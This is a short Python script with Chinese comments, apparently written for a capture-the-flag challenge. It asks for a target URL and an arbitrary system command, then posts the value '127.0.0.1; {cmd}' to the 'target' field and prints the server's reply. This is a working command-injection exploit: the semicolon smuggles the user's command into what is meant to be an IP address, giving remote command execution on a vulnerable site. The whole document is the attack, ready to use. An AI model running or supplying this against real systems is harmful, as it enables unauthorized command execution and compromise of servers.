import requests

# 输入题目网址
url = input("请输入题目网址: ")

# 输入想执行的系统命令
cmd = input("请输入执行命令: ")

# 构造命令注入 Payload
data = {
    "target": f"127.0.0.1; {cmd}"
}

# 发送 POST 请求
res = requests.post(url, data=data)

# 输出结果
print(res.text)